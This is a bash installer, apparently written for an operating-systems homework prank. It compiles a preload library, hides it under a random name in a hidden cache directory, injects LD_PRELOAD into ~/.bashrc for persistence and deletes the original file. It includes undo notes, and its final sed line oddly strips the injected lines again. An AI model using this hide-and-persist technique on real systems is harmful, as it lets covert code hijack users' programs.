#!/bin/bash

#IMPORTANT NOTE: READ ME BEFORE EXECUTING!!!: 
# This Script makes the hijack work for every new opened Terminal after execution !!
# 
# How it works: 
#
# export LD_PRELOAD in ~/bashrc on the last two lines
#
# To run:
#
# run with: ./OShomework
#
# How to undo it:
# 
# remove the 2 last LD_PRELOAD lines on the ~/bashrc file with: 
# "nano ~/.bashrc" and scroll to bottom 
#
# "unset LD_PRELOAD" still works but only for the active terminal. 

# Compile the .so from the .c file
gcc -shared -fPIC -o preloadLib.so preloadLib.c -ldl

# IMPORTANT NOTE: make sure you have your own paths to the code here if you want to run on your own device!!!
SOURCE_SO="$HOME/Documents/OS_Project/osProject/main/src/test/preloadLib.so"
HIDDEN_DIR="$HOME/.cache/.syslib"
NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME" # hides the .so in a hidden directory with a random name 
BASHRC="$HOME/.bashrc"
MARKER="# [LD_PRELOAD injected]" # marker to identify where the added lines are

echo "[*] Starting installation..."
sleep 1
echo "Have fun copying my homework!"
sleep 1

# Check if source.so exists
if [ ! -f "$SOURCE_SO" ]; then
    echo "[x] Error: Source .so file not found at: $SOURCE_SO"
    exit 1
fi

# Create hidden directory
mkdir -p "$HIDDEN_DIR"

# Copy and rename the .so file
cp "$SOURCE_SO" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"

# Export LD_PRELOAD only in this session (if wanted)
#source LD_PRELOAD="$HIDDEN_SO"

# Inject LD_PRELOAD into .bashrc
echo "" >> "$BASHRC"
echo "$MARKER" >> "$BASHRC"
echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$BASHRC"
echo "alias geary='DISABLE_WRITE_PRANK=1 geary'" >> "$BASHRC"


# Optionally delete the original .so
rm -f "$SOURCE_SO"
# maybe also add to remove the original .c file (probably not)? 

echo "[*] Install complete."
echo "[!] Open a new terminal to continue testing."
echo "[!] Original .so deleted, have fun trying to find it ;)"

# Remove LD_PRELOAD lines from .bashrc (doesn't do it automatically)
sed -i "/$MARKER/,+1d" "$BASHRC"
# Launch the new shell
DISABLE_GETCHAR_PRANK=1 bash





